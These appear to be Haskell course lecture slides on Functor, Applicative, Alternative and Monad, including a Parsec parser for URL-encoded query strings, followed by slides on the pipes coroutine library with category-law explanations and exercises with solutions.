You may not have come across the ‚Äútupling‚Äù operator yet: 

.. code:: haskell

   (,) :: a -> b -> (a, b)

Given two arguments, it returns a pair consisting of those arguments.

Partial application of a pair
=============================

Since ``(,)`` is a operator, we can surround it in parentheses to use it
as a function.

.. code:: haskell

   ghci> :type (,) 'X' True
   (,) 'X' True :: (Char, Bool)

In typical Haskell fashion, we can partially apply the function to yield
another function:

.. code:: haskell

   ghci> :type (,) 'X'
   (,) 'X' :: b -> (Char, b)

Type signatures and tuples
==========================

OK, we can use ``(,)`` in prefix position as a function.

We can also write ``(,)`` as a *type constructor*.

.. code:: haskell

   foo :: b -> (,) Char b
   foo b = (,) 'X' b

This means *exactly the same thing* as the following signature:

.. code:: haskell

   foo :: b -> (Char, b)

Functors over tuples
====================

What should a ``MyFunctor`` instance for pairs look like?

.. code:: haskell

   instance MyFunctor ((,) a) where
       {- ... -}

Remember, for a type to be an instance of ``MyFunctor``, we need one
free type parameter:

.. code:: haskell

   class MyFunctor f where
       myfmap :: (a -> b) -> f a -> f b

By convention, we choose the second element of the pair to be free in
our ``MyFunctor`` instance.

What should ``myfmap`` look like? 

Getting weirder
===============

How useful is our functors-as-containers metaphor? 

Recall the enigmatic ``Identity`` type.

.. code:: haskell

   newtype Identity a = Identity a

Since this is a ``newtype``, it has no runtime representation.

So strictly speaking, it‚Äôs not really a container: 

-  Apart from type system machinery, there‚Äôs no ‚Äúoutside‚Äù for something
   to be ‚Äúinside‚Äù of.

Why talk about prefix operators?
================================

I had a purpose in talking about ``(,)`` as a prefix operator.

We can do the same with the ``(->)`` operator for describing functions.

.. code:: haskell

   foo :: (->) Char Bool
   foo c = isUpper c

Since we were able to write a ``MyFunctor`` instance for pairs:

.. code:: haskell

   instance MyFunctor ((,) a) where
       myfmap f (a, b) = (a, f b)

Can we do the same for functions? 

Functors for functions
======================

.. code:: haskell

   instance MyFunctor ((,) a) where
       myfmap f (a, b) = (a, f b)

Anyone want to take a crack at this? 

.. code:: haskell

   instance MyFunctor ((->) a) where
       {- ... -}

.. _functors-for-functions-1:

Functors for functions
======================

A definition wasn‚Äôt too hard to come up with: 

.. code:: haskell

   instance MyFunctor ((->) a) where
       myfmap f g = \x -> f (g x)

But what does this *mean*? 

-  It is clearly *not* a container.

Functors for IO
===============

We already touched on functors in the context of ``IO``.

.. code:: haskell

   readFile "/etc/passwd"

This executes a real-world action, and gives us back a ``String``.

.. code:: haskell

   (length . lines) `fmap` readFile "/etc/passwd"

This executes the same real-world action, and gives us back‚Ä¶ *what?*

Functor laws
============

Mapping the identity function has no effect on the result.

.. code:: haskell

   fmap id === id

Mapping the composition of two functions is the same as composing the
mapping of the same functions.

.. code:: haskell

   fmap (g . h) = (fmap g) . (fmap h)

Lifting, revisited
==================

The standard way of writing the type of ``fmap`` can be a bit obscure:

.. code:: haskell

   class Functor f where
       fmap :: (a -> b) -> f a -> f b

.. _lifting-revisited-1:

Lifting, revisited
==================

Functions in Haskell are always *curried*, so ``fmap`` ‚Äúis really‚Äù a
function of one argument that returns another function.

Let‚Äôs add parentheses to make this clear.

.. code:: haskell

   class Functor f where
       fmap :: (a -> b) -> (f a -> f b)

It *lifts* its first argument from being a normal function to one that
operates in this universe where everything is shrouded in ``f``.

Why focus on functors?
======================

You‚Äôll come across the damn things everywhere in Haskell.

Next to ``Monoid``, ``Functor`` is one of the simplest abstractions in
Haskell.

The fact that ``(->) a`` is a ``Functor`` (but *not* a container) is
*invaluable*:

-  It dislodges us from using limiting container-focused metaphors to
   think about these abstractions.

Giving ``f`` a name
===================

.. code:: haskell

   class Functor f where
       fmap :: (a -> b) -> (f a -> f b)

So containers are only a training-wheels metaphor.

It‚Äôll still be helpful to generically refer to this ``f`` thing by a
name.

We‚Äôll call it a *context*.

Contexts
========

The ``[]`` functor:

-  The context is a list.

The ``(->) a`` functor:

-  Our context is a function that has a first argument of type ``a`` (a
   ‚Äúread-only environment‚Äù).

The ``IO`` functor:

-  Our context is computations that may have real-world effects.

Applicative
===========

Here‚Äôs our next step up the expressive ladder.

.. code:: haskell

   class Functor f => Applicative f where
       pure  :: a -> f a
       (<*>) :: f (a -> b) -> f a -> f b

The ``pure`` function takes a value and lifts it into our new context.

Where ‚Äúapplicative‚Äù comes from
==============================

What about ``(<*>)``? 

Consider its similarity to both ``fmap`` and ``($)``.

.. code:: haskell

   (<*>) :: f (a -> b) -> f a -> f b
   fmap  ::   (a -> b) -> f a -> f b
   ($)   ::   (a -> b) ->   a ->   b

*They‚Äôre clearly all related!*

-  ``($)`` is function application

-  ``fmap`` is function application lifted to functors

-  ``(<*>)`` is function application lifted to functors, but where the
   initial function is wrapped in our context ``f`` too

This is the origin of the name ‚Äúapplicative‚Äù.

Applicative laws
================

Just as with monoids and functors, instances of ``Applicative`` must
follow some laws.

In this case, there are 4 laws.

You can refer to them `at the Typeclassopedia <http://www.haskell.org/haskellwiki/Typeclassopedia#Laws_2>`__
if you‚Äôre interested.

Just one Applicative instance
=============================

.. code:: haskell

   class Functor f => Applicative f where
       pure  :: a -> f a
       (<*>) :: f (a -> b) -> f a -> f b

This will give us the flavour of the ``Applicative`` class.

.. code:: haskell

   instance Applicative Maybe where
       pure x = Just x

What should the implementation of ``(<*>)`` look like?

.. code:: haskell

   -- (<*>) :: f     (a -> b) -> f     a -> f     b
   (<*>)    :: Maybe (a -> b) -> Maybe a -> Maybe b

Take 2 minutes to write your own.

.. _just-one-applicative-instance-1:

Just one Applicative instance
=============================

.. code:: haskell

   class Functor f => Applicative f where
       pure  :: a -> f a
       (<*>) :: f (a -> b) -> f a -> f b

This will give us the flavour of the ``Applicative`` class.

.. code:: haskell

   instance Applicative Maybe where
       pure x = Just x

What should the implementation of ``(<*>)`` look like?

.. code:: haskell

   (<*>) :: Maybe (a -> b) -> Maybe a -> Maybe b

   Just f <*> Just x = Just (f x)
   _      <*> _      = Nothing

Further study
=============

If you want to gain some good understanding of ``Applicative``:

-  Write instances for lists, ``Identity``, and ``(->) a``

Bonus material:

.. code:: haskell

   newtype MyConst a b = MyConst a

Write ``Functor`` and ``Applicative`` instances for the ``MyConst`` type
above.

Why all the fuss?
=================

Here‚Äôs a tiny ``Applicative``-powered parser for URL-encoded bytes such
as ``%27``.

.. code:: haskell

   import Control.Applicative
   import Data.Char (chr)
   import Numeric (readHex)
   import Text.Parsec (char, hexDigit)
   import Text.Parsec.String (Parser)

   hexChar :: Parser Char
   hexChar = char '%' *> (combo <$> hexDigit <*> hexDigit)
     where combo a b = case readHex [a,b] of
                         [(n,"")] -> chr n
                         _        -> error "wat"

This depends on:

.. code:: haskell

   -- Sequence two actions, discarding the result of the first.
   (*>) :: Applicative f => f a -> f b -> f b

   -- You'll see this everywhere.
   (<$>) = fmap

Going deeper
============

Let‚Äôs parse an entire ``application/x-www-form-urlencoded`` string.

They look like this: 

::

   name=bryan+o%27sullivan&city=san+francisco

Top-level parser: 

.. code:: haskell

   query = pair `sepBy` char '&'

We‚Äôll revisit ``sepBy`` in a moment.

.. code:: haskell

   -- Zero or more elements, separated by a separator.
   sepBy :: Alternative f => f a -> f sep -> f [a]

First, we must grok ``Alternative``.

The ``Alternative`` class
=========================

This class combines monoids with applicative functors: 

.. code:: haskell

   class Applicative f => Alternative f where
       empty :: f a
       (<|>) :: f a -> f a -> f a

``empty`` corresponds to ``mempty``.

-  When parsing, think of this as ‚Äúthe parse failed‚Äù.

``(<|>)`` corresponds to ``mappend``/``(<>)``.

-  When parsing, think of this as ‚Äútry the first parse; if it fails, try
   the second‚Äù.

Some handy combinators
======================

Notice that 

.. code:: haskell

   -- Zero or more elements, separated by a separator.
   sepBy :: Alternative f => f a -> f sep -> f [a]
   sepBy p sep = sepBy1 p sep <|> pure []

   -- One or more elements, separated by a separator.
   sepBy1 :: Alternative f => f a -> f sep -> f [a]
   sepBy1 p sep = (:) <$> p <*> many (sep *> p)

   many :: Alternative f => f a -> f [a]

More parsing
============

.. code:: haskell

   pair :: Parser (String, Maybe String)
   pair = (,) <$> many1 urlChar
              <*> optional (char '=' *> many urlChar)

   urlChar = oneOf urlBaseChars
         <|> hexChar
         <|> ' ' <$ char '+'

New combinators: 

.. code:: haskell

   optional :: Alternative f => f a -> f (Maybe a)

   -- Replace all locations in the input with the same value.
   (<$) :: Functor f => a -> f b -> f a

Our complete parser
===================

This code is amazingly compact and readable! 

.. code:: haskell

   query = pair `sepBy` char '&'

   pair :: Parser (String, Maybe String)
   pair = (,) <$> many1 urlChar
              <*> optional (char '=' *> many urlChar)

   urlChar = oneOf urlBaseChars
         <|> hexChar
         <|> ' ' <$ char '+'

   hexChar :: Parser Char
   hexChar = char '%' *> (eval <$> hexDigit <*> hexDigit)
     where eval a b = case readHex [a,b] of
                        [(n,"")] -> chr n
                        _        -> error "wat"

   urlBaseChars = ['a'..'z']++['A'..'Z']++['0'..'9']++"$-_.!*'(),"

And finally, on to ``Monad``
============================

Every ``Applicative`` is a ``Functor``.

And every ``Monad`` is an ``Applicative``.

.. code:: haskell

   class Monad m where
       return :: a -> m a
       (>>=)  :: m a -> (a -> m b) -> m b

``return`` is the same as ``pure``.

What about ``(>>=)`` (‚Äúbind‚Äù)? 

Where does it fit into our mental universe? 

A convenient variation
======================

There‚Äôs a standard function named ``(=<<)`` which is exactly ``(>>=)``,
but with its arguments flipped.

.. code:: haskell

   (>>=) :: Monad m => m a        -> (a -> m b) -> m b
   (=<<) :: Monad m => (a -> m b) -> m a        -> m b

Why should we care? 

Let‚Äôs revisit an earlier slide
==============================

Remember this? 

.. code:: haskell

   (<*>) :: Applicative f => f (a -> b) -> f a -> f b
   fmap  :: Functor f =>       (a -> b) -> f a -> f b
   ($)   ::                    (a -> b) ->   a ->   b

These are all different ways of applying a function to a value.

.. _lets-revisit-an-earlier-slide-1:

Let‚Äôs revisit an earlier slide
==============================

A small change: add ``(=<<)``.

.. code:: haskell

   (=<<) :: Monad m =>         (a -> m b) -> m a -> m b

   (<*>) :: Applicative f => f (a -> b)   -> f a -> f b
   fmap  :: Functor f =>       (a -> b)   -> f a -> f b
   ($)   ::                    (a -> b)   ->   a ->   b

So really, the ``(>>=)`` operator is ‚Äújust‚Äù another application
operator, but its flipped argument order obscures this.

What ``Functor`` and ``Applicative`` cannot do
==============================================

Consider application with functors and applicative functors:

.. code:: haskell

   (<*>) :: Applicative f => f (a -> b)   -> f a -> f b
   fmap  :: Functor f =>       (a -> b)   -> f a -> f b

How do we ensure that they can only operate on the *elements* of a
container?

-  Their function argument *cannot see or influence* ``f`` at all.

-  As a result, they *must* be oblivious to the enclosing structure of
   the container (or computational context, or whatever).

From ``Applicative`` to ``Monad``
=================================

The key to ``Monad`` is that the ``a -> m b`` function can take a normal
Haskell value *and use it to decide* what ``m b`` to give back:

-  It is able to influence the container‚Äôs structure, change the
   context, launch the nukes, or what have you.

.. code:: haskell

   (=<<) :: Monad m =>         (a -> m b) -> m a -> m b

   (<*>) :: Applicative f => f (a -> b)   -> f a -> f b

Compared to ``Applicative``, ``Monad`` is both more powerful *and*
harder to reason about.

The present and future of these classes
=======================================

``Applicative`` and ``Functor`` are related. ``Monad`` is independent of
the other two due to accidents of history.

This will change with GHC 7.10.

A useful rule of thumb
======================

Always try to use the *least powerful* abstraction you can.

Use ``Applicative`` in preference to ``Monad``.

Use ``Functor`` in preference to ``Applicative``.

(Unless you can‚Äôt, of course.)

Why?

-  The less powerful the abstraction, the easier its behaviour is to
   reason about.

-  It becomes harder for you and your users to perform foot-shooting.


/L10 Pipes Overview
===================

-  **[The problem ``pipes`` solves]**
-  How ``pipes`` works
-  Theory behind ``pipes``
-  Tour of the ``pipes`` API

The problem
===========

.. code:: haskell

   replicateM :: Monad m => Int -> m a -> m [a]

   mapM :: Monad m => (a -> m b) -> [a] -> m [b]

   sequence :: Monad m => [m a] -> m [a]

-  Does not work on infinite lists
-  You can‚Äôt consume any results until everything has been processed
-  You have to run the entire computation, even if you don‚Äôt need every
   result
-  This wastes memory by buffering every result

Non-solution: lazy IO
=====================

-  Only works for ``IO``
-  Only works for effectful sources, not effectful sinks or
   transformations
-  Invalidates equational reasoning by tying effects to evaluation order
-  Admission of defeat (‚ÄúMonads are too awkward‚Äù)

``pipes`` - a coroutine library
===============================

.. code:: haskell

   import Pipes
   import System.IO (isEOF)

   stdinLn :: Producer String IO ()
   stdinLn = do
       eof <- lift isEOF
       if eof
           then return ()
           else do
               str <- lift getLine
               yield str
               stdinLn

   useString:: String -> Effect IO ()
   useString str = lift (putStrLn str)

   echo :: Effect IO ()
   echo = for stdinLn useString

   main :: IO ()
   main = runEffect echo

Example
=======

.. code:: bash

   $ ./example
   Hello<Enter>
   Hello
   CS240H<Enter>
   CS240H
   <Ctrl-D>
   $

Questions?
==========

.. _overview-1:

Overview
========

-  The problem ``pipes`` solves
-  **[How ``pipes`` works]**
-  Theory behind ``pipes``
-  Tour of the ``pipes`` API

``Producer``
============

.. code:: haskell

   import Control.Monad.Trans.Class (MonadTrans(lift))

   data Producer a m r
       = Yield a (Producer a m r)
       | M    (m (Producer a m r))
       | Return r

   yield :: a -> Producer a m ()
   yield a = Yield a (Return ())

   instance Monad m => Monad (Producer a m) where
   --  return :: Monad m => r -> Producer a m r
       return r = Return r

   --  (>>=) :: Monad m
   --        => Producer a m r -> (r -> Producer a m s) -> Producer a m s
       (Yield a p) >>= return' = Yield a (p >>= return')
       (M       m) >>= return' = M (m >>= \p -> return (p >>= return'))
       (Return  r) >>= return' = return' r

   instance MonadTrans (Producer a) where
   --  lift :: Monad m => m r -> Producer a m r
       lift m = M (liftM Return m)

``stdinLn``
===========

.. code:: haskell

   stdinLn = do
       eof <- lift isEOF
       if eof
           then return ()
           else do
               str <- lift getLine
               yield str
               stdinLn

   useString str = lift (putStrLn str)

.. code:: haskell

   stdinLn =
       M (isEOF >>= \eof -> return $
           if eof
           then Return ()
           else M (getLine >>= \str ->
               Yield str stdinLn ) )

   useString str = M (putStrLn str >>= \r -> return (Return r))

``for``
=======

.. code:: haskell

   for :: Monad m
       => Producer a m ()
       -> (a -> Producer b m ())
       -> Producer b m ()
   for (Yield a p) yield' = yield' a >> for p yield'
   for (M       m) yield' = M (m >>= \p -> return (for p yield'))
   for (Return  r) _      = Return r

.. code:: haskell

   echo = for stdinLn useString 

   echo =
       M (isEOF >>= \eof -> return $
           if eof
           then Return ()
           else M (getLine >>= \str ->
                    M (putStrLn str >> return echo) ) )

``runEffect``
=============

.. code:: haskell

   data Void  -- No constructors

   type Effect = Producer Void

   runEffect :: Monad m => Effect m r -> m r
   runEffect (M      m) = m >>= runEffect
   runEffect (Return r) = return r

.. code:: haskell

   main = runEffect echo

   main =
       isEOF >>= \eof ->
           if eof 
           then return ()
           else getLine >>= \str ->
                    putStrLn str >> main

.. _questions-1:

Questions?
==========

.. _overview-2:

Overview
========

-  The problem ``pipes`` solves
-  How ``pipes`` works
-  **[Theory behind ``pipes``]**
-  Tour of the ``pipes`` API

What makes Haskell unique?
==========================

-  Design patterns are inspired by category theory
-  Theory is culturally enshrined in type classes:

   -  ``Monoid``, ``Category``, ``Applicative``, ``Monad``, ‚Ä¶

-  **Goal:** reduce software complexity

.. _the-problem-1:

The problem
===========

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/noflo.png


How do we reduce complexity?
============================

.. code:: haskell

   class Monoid m where
       mappend :: m -> m -> m
       mempty  :: m

   (<>) :: Monoid m => m -> m -> m
   (<>) = mappend

.. code:: haskell

   instance Monoid Int where
       -- mappend :: Int -> Int -> Int
       mappend = (+)

       -- mappend :: Int
       mempty  =  0

.. code:: haskell

   -- Associativity
   (x <> y) <> z = x <> (y <> z)  -- (x + y) + z = x + (y + z)

   -- Identity:
   mempty <> x = x                -- 0 + x = x

   x <> mempty = x                -- x + 0 = x

``yield``
=========

.. code:: haskell

   yield :: a -> Producer a IO ()

A ``Producer`` that ``yield`` s exactly one element:

.. code:: haskell

   yieldOne :: Monad m => Producer String m ()
   yieldOne = yield "Hello"

A ``Producer`` that ``yield`` s more than one element:

.. code:: haskell

   yieldTwo :: Monad m => Producer String m ()
   yieldTwo = do
       yield "Hello"
       yield "CS240H"

   -- yieldTwo = yield "Hello" >> yield "CS240H"

A ``Producer`` that ``yield`` s less than one element:

.. code:: haskell

   yieldZero :: Monad m => Producer String m ()
   yieldZero = return ()

.. _example-1:

Example
=======

::

   >>> runEffect (for yieldOne useString)
   Hello
   >>> runEffect (for yieldTwo useString)
   Hello
   CS240H
   >>> runEffect (for yieldZero useString)
   >>> -- Nothing output

Primitive vs. Derived
=====================

.. code:: haskell

   yieldFour :: Monad m => Producer String m ()
   yieldFour = do
       yieldTwo
       yieldTwo

   -- yieldFour = yieldTwo >> yieldTwo

::

   >>> runEffect (for yieldFour useString)
   Hello
   CS240H
   Hello
   CS240H

``(>>)`` and ``return ()`` form a Monoid
========================================

.. code:: haskell

   (>>)      :: Producer a IO ()  -- (<>)    :: m
             -> Producer a IO ()  --         -> m
             -> Producer a IO ()  --         -> m

   return () :: Producer a IO ()  -- mempty  :: m

Associativity:

.. code:: haskell

   (p1 >> p2) >> p3 = p1 >> (p2 >> p3)  -- (x <> y) <> z = x <> (y <> z)

Identity:

.. code:: haskell

   return () >> p = p                   -- mempty <> x = x

   p >> return () = p                   -- x <> mempty = x

Categories generalize Monoids
=============================

.. code:: haskell

   class Category cat where                  -- class Monoid m where
       (.) :: cat b c -> cat a b -> cat a c  --     mappend :: m -> m -> m
       id  :: cat a a                        --     mempty  :: m

   (>>>) :: Category cat => cat a b -> cat b c -> cat a c
   (>>>) = flip (.)

.. code:: haskell

   instance Category (->) where
       -- (.) :: (b -> c) -> (a -> b) -> (a -> c)
       (g . f) x = g (f x)

       -- id  :: (a -> a)
       id x = x

.. code:: haskell

   -- Associativity
   (f . g) . h = f . (g . h)                 -- (x <> y) <> z = x <> (y <> z)

   -- Identity
   id . f = f                                -- mempty <> x = x

   f . id = f                                -- x <> mempty = x

``(>=>)`` and ``return`` form a Category
========================================

.. code:: haskell

   (>=>)  :: Monad m
          => (a -> Producer o m b)  -- (>>>) :: cat a b
          -> (b -> Producer o m c)  --       -> cat b c
          -> (a -> Producer o m c)  --       -> cat a c
   (f >=> g) x = f x >>= g

   return :: Monad m
          => (a -> Producer o m a)  -- id    :: cat a a

Associativity:

.. code:: haskell

   (f >=> g) >=> h = f >=> (g >=> h)      -- (f >>> g) >>> h = f >>> (g >>> h)

Identity:

.. code:: haskell

   return >=> f = f                       -- id >>> f = f

   f >=> return = f                       -- f >>> id = f

Monad Laws
==========

Associativity:

.. code:: haskell

   (f >=> g) >=> h = f >=> (g >=> h)

   (m >>= g) >>= h = m >>= \x -> g x >>= h

Left identity:

.. code:: haskell

   return >=> f = f

   return x >>= f = f

.. code:: haskell

   f >=> return = f

   m >>= return = m

``(~>)`` and ``yield`` form a Category
======================================

.. code:: haskell

   (~>)  :: (a -> Producer b IO ())  -- (>>>) :: cat a b
         -> (b -> Producer c IO ())  --       -> cat b c
         -> (a -> Producer c IO ())  --       -> cat a c
   (f ~> g) x = for (f x) g

   yield :: (a -> Producer a IO ())  -- id    :: cat a a

Associativity:

.. code:: haskell

   (f ~> g) ~> h = f ~> (g ~> h)     -- (f >>> g) >>> h = f >>> (g >>> h)

Identity:

.. code:: haskell

   yield ~> f = f                    -- id >>> f = f

   f ~> yield = f                    -- f >>> id = f

``for`` loop laws - Part 1
==========================

.. code:: haskell

   yield ~> f = f

   for (yield x) f = f x

::

   >>> runEffect (for (yield "Hello") useString)
   Hello
   >>> runEffect (useString "Hello")
   Hello
   >>>

.. code:: haskell

   f ~> yield = f

   for m yield = m

::

   >>> let yieldTwo' = for yieldTwo yield
   >>> runEffect (for yieldTwo' useString)
   Hello
   CS240H
   >>> runEffect (for yieldTwo useString)
   Hello
   CS240H
   >>>

``for`` loop laws - Part 2
==========================

.. code:: haskell

   (f ~> g) ~> h = f ~> (g ~> h)

   for (for p g) h = for p (\x -> for (g x) h)

.. code:: haskell

   stdinLn :: Producer String IO ()       -- Same as before

   twice :: Monad m => a -> Producer a m ()
   twice a = do
       yield a
       yield a

   useString :: String -> Effect IO ()    -- Same as before

.. code:: haskell

   echoTwice :: Effect IO ()
   echoTwice = for (for stdinLn twice) useString

   echoTwice' :: Effect IO ()
   echoTwice' = for stdinLn $ \str1 -> for (twice str1) useString

.. _example-2:

Example
=======

::

   >>> runEffect echoTwice
   Hello<Enter>
   Hello
   Hello
   CS240H<Enter>
   CS240H
   CS240H
   ...
   >>> runEffect echoTwice'
   Hello<Enter>
   Hello
   Hello
   CS240H<Enter>
   CS240H
   CS240H
   ...

Reduce the complexity of coroutines
===================================

.. code:: haskell

   import Pipes
   import System.IO (isEOF)

   stdinLn :: Producer String IO ()
   stdinLn = do
       eof <- lift isEOF
       if eof
           then return ()
           else do
               str <- lift getLine
               yield str
               stdinLn

   useString:: String -> Effect IO ()
   useString str = lift (putStrLn str)

   echo :: Effect IO ()
   echo = for stdinLn useString

   main :: IO ()
   main = runEffect echo

.. _questions-2:

Questions?
==========

.. _overview-3:

Overview
========

-  The problem ``pipes`` solves
-  How ``pipes`` works
-  Theory behind ``pipes``
-  **[Tour of the ``pipes`` API]**

``Consumer``
============

A sink that changes over time

.. code:: haskell

   import Pipes
   import Pipes.Prelude (stdinLn)

   numbered :: Int -> Consumer String IO r
   numbered n = do
       str <- await
       let str' = show n ++ ": " ++ str
       lift (putStrLn str')
       numbered (n + 1)

   giveString :: Effect IO String
   giveString = lift getLine

   nl :: Effect IO ()
   nl = giveString >~ numbered 0

   main :: IO ()
   main = runEffect nl

.. _example-3:

Example
=======

::

   >>> main
   Hello<Enter>
   0: Hello
   CS240H<Enter>
   1: CS240H
   ...

.. _consumer-1:

``Consumer``
============

.. code:: haskell

   data Consumer a m r
       = Await (a -> Consumer a m r )
       | M       (m (Consumer a m r))
       | Return r

   await :: Consumer a m a
   await = Await (\a -> Return a)

``await``
=========

.. code:: haskell

   await :: Consumer a IO a

A ``Consumer`` that ``await`` s more than one element:

.. code:: haskell

   awaitTwo :: Monad m => Consumer String m String
   awaitTwo = do
       str1 <- await
       str2 <- await
       return (str1 ++ " " ++ str2)

A ``Consumer`` that ``await`` s zero elements:

.. code:: haskell

   awaitZero :: Monad m => Consumer String m String
   awaitZero = return "Some string"

.. _example-4:

Example
=======

::

   >>> runEffect (giveString >~ awaitOne)
   Hello<Enter>
   Hello
   >>> runEffect (giveString >~ awaitTwo)
   Hello<Enter>
   CS240H<Enter>
   Hello CS240H
   >>> runEffect (giveString >~ awaitZero)
   Some string

.. _primitive-vs.-derived-1:

Primitive vs. Derived
=====================

.. code:: haskell

   awaitFour :: Monad m => Consumer String m String
   awaitFour = do
       str1 <- awaitTwo
       str2 <- awaitTwo
       return (str1 ++ " " ++ str2)

::

   >>> runEffect (giveString >~ awaitFour)
   Hello<Enter>
   CS240H<Enter>
   You're<Enter>
   welcome!<Enter>
   Hello CS240H You're welcome!

``(>~)``
========

.. code:: haskell

   (>~) :: Monad m
        => Consumer a m b  -- (>>>) :: cat a b
        -> Consumer b m c  --       -> cat b c
        -> Consumer a m c  --       -> cat a c

::

   >>> runEffect (giveString >~ awaitTwo >~ numbered)
   Hello<Enter>
   CS240H<Enter>
   0: Hello CS240H
   You're<Enter>
   welcome!<Enter>
   1: You're welcome!
   ...

``(>~)`` and ``await`` form a Category
======================================

.. code:: haskell

   (>~)  :: Consumer a IO b       -- (>>>) :: cat a b
         -> Consumer b IO c       --       -> cat b c
         -> Consumer a IO c       --       -> cat a c

   await :: Consumer a IO a       -- id    :: cat a a

Associativity:

.. code:: haskell

   (f >~ g) >~ h = f >~ (g >~ h)  -- (f >>> g) >>> h = f >>> (g >>> h)

Identity:

.. code:: haskell

   await >~ f = f                 -- id >>> f = f

   f >~ await = f                 -- f >>> id = f

.. _questions-3:

Questions?
==========

Mix ``Producer`` s and ``Consumer`` s using ``(>->)``
=======================================================

.. code:: haskell

   (>->) :: Producer a IO r
         -> Consumer a IO r
         -> Effect     IO r

.. code:: haskell

   main :: IO ()
   main = runEffect (stdinLn >-> numbered)

::

   $ ./example
   Hello<Enter>
   0: Hello
   CS240H<Enter>
   1: CS240
   <Ctrl-D>
   $

``Pipe``
========

.. code:: haskell

   data Pipe a b m r
       = Await (a -> Pipe a b m r )
       | Yield  b   (Pipe a b m r)
       | M     (m   (Pipe a b m r))
       | Return r

   await :: Pipe a b IO a

   yield :: b -> Pipe a b IO ()

.. code:: haskell

   take :: Int -> Pipe a a IO ()
   take n | n <= 0    = lift (putStrLn "You shall not pass!")
          | otherwise = do a <- await
                           yield a
                           take (n - 1)

.. code:: haskell

   import Control.Monad (replicateM_)

   take n = do
       replicateM_ n (await >>= yield)
       lift (putStrLn "You shall not pass!")

.. _example-5:

Example
=======

::

   >>> runEffect (stdinLn >-> take 2 >-> numbered)
   Hello<Enter>
   0: Hello
   CS240H<Enter>
   1: CS240H
   You shall not pass!

Behavior switching
==================

.. code:: haskell

   import Control.Monad (forever)  -- forever m = m >> forever m

   cat :: Pipe a a IO r
   cat = forever $ do
       a <- await
       yield a

   customerService :: Pipe String String IO ()
   customerService = do
       yield "Hello"
       take 10
       yield "Could you please hold for one second?"
       cat

What the types? - Part 1
========================

What is the deal?

.. code:: haskell

   lift :: IO r -> Producer a IO r
   lift :: IO r -> Consumer a IO r
   lift :: IO r -> Effect     IO r

.. code:: haskell

   await :: Consumer a   m a
   await :: Pipe     a b m a

.. code:: haskell

   yield :: b -> Producer b m ()
   yield :: b -> Pipe   a b m ()

What the types? - Part 2
========================

.. code:: haskell

   (>->) :: Producer a IO r
         -> Pipe   a b IO r
         -> Producer b IO r

   (>->) :: Pipe   a b IO r
         -> Consumer b IO r
         -> Consumer a IO r

   (>->) :: Pipe a b IO r
         -> Pipe b c IO r
         -> Pipe a c IO r

Polymorphism
============

``Consumer`` is special case of ``Pipe``

.. code:: haskell

   type Consumer a = Pipe a Void

``Producer`` is (basically) a special case of ``Pipe``

.. code:: haskell

   type Producer b = Pipe () b     -- White lie

-  This is ‚Äúparametric polymorphism‚Äù (i.e. generics)

-  This is *not* ad-hoc polymorphism (i.e. type classes)

``(>->)`` and ``cat`` form a ``Category``
=========================================

.. code:: haskell

   (>->) :: Pipe a b IO r  -- (>>>) :: cat a b
         -> Pipe b c IO r  --       -> cat b c
         -> Pipe a c IO r  --       -> cat a c

   cat   :: Pipe a a IO r  -- id    :: cat a a

Associativity:

.. code:: haskell

   (f >-> g) >-> h = f >-> (g >-> h)  -- (f >>> g) >>> h = f >>> (g >> h)

Identity:

.. code:: haskell

   cat >-> f = f                      -- id >>> f = f

   f >-> cat = f                      -- f >>> id = f

API inspired by category theory
===============================

=========== ==========
Composition Identity
=========== ==========
``(>=>)``   ``return``
``(~>)``    ``yield``
``(>~)``    ``await``
``(>->)``   ``cat``
=========== ==========

This is just the beginning:

.. code:: haskell

   (f >=> g) ~> h = (f ~> h) >=> (g ~> h)  -- (x + y) * z = (x * z) + (y * z)

   return ~> h = return                    -- 0 * z = 0

**Goal:** Categorical semantics

Conclusion
==========

-  Composability keeps software architectures flat

-  Small amounts of theory go a very long way

Exercise #1
===========

Implement ``takeWhile``

.. code:: haskell

   import Pipes
   import Pipes.Prelude (stdinLn, stdoutLn)
   import Prelude hiding (takeWhile)

   takeWhile :: Monad m => (a -> Bool) -> Pipe a a m ()
   takeWhile keep = ???

   main = runEffect (stdinLn >-> takeWhile (/= "quit") >-> stdoutLn)

::

   >>> main
   Hello<Enter>
   Hello
   CS240H<Enter>
   CS240H
   quit<Enter>
   >>>

Solution #1
===========

.. code:: haskell

   import Pipes
   import Pipes.Prelude (stdinLn, stdoutLn)
   import Prelude hiding (takeWhile)

   takeWhile :: Monad m => (a -> Bool) -> Pipe a a m ()
   takeWhile keep = do
       a <- await
       if keep a
           then do
               yield a
               takeWhile keep
           else return ()

   main = runEffect (stdinLn >-> takeWhile (/= "quit") >-> stdoutLn)

Exercise #2
===========

Implement ``map``

.. code:: haskell

   import Pipes
   import Pipes.Prelude (stdinLn, stdoutLn)
   import Prelude hiding (map)

   map :: Monad m => (a -> b) -> Pipe a b m ()
   map f = ???

   main = runEffect (stdinLn >-> map (++ "!") >-> stdoutLn)

::

   >>> main
   Hello<Enter>
   Hello!
   CS240H<Enter>
   CS240H!
   ...

Solution #2
===========

.. code:: haskell

   import Pipes
   import Pipes.Prelude (stdinLn, stdoutLn)
   import Prelude hiding (map)

   map :: Monad m => (a -> b) -> Pipe a b m ()
   map f = for cat (yield . f)

   main = runEffect (stdinLn >-> map (++ "!") >-> stdoutLn)

::

   cat = forever $ do
       a <- await
       yield a

   for cat (yield . f)

   = forever $ do
       a <- await
       (yield . f) a

   = forever $ do
       a <- await
       yield (f a)

Exercise #3
===========

What does ``mystery`` do?

.. code:: haskell

   import Control.Monad (replicateM_)
   import Pipes

   mystery :: Monad m => Int -> Pipe a a m r
   mystery n = do
       replicateM_ n await
       cat

Solution #3
===========

.. code:: haskell

   import Control.Monad (replicateM_)
   import Pipes

   drop :: Monad m => Int -> Pipe a a m r
   drop n = do
       replicateM_ n await
       cat

::

   >>> runEffect (stdinLn >-> drop 2 >-> stdoutLn)
   A<Enter>
   B<Enter>
   C<Enter>
   C
   D<Enter>
   D
   ...

Exercise #4
===========

What does ``mystery`` do?

.. code:: haskell

   import Pipes

   mystery :: Monad m => Producer String m r
   mystery = return "y" >~ cat

Solution #4
===========

.. code:: haskell

   import Pipes

   yes :: Monad m => Producer String m r
   yes = return "y" >~ cat

Exercise #5
===========

Implement ``grep``

.. code:: haskell

   -- grep.hs

   import Data.List (isInfixOf)
   import Pipes
   import qualified Pipes.Prelude as Pipes

   -- Use: hackage.haskell.org/package/pipes

   grep :: Monad m => String -> Pipe String String m r
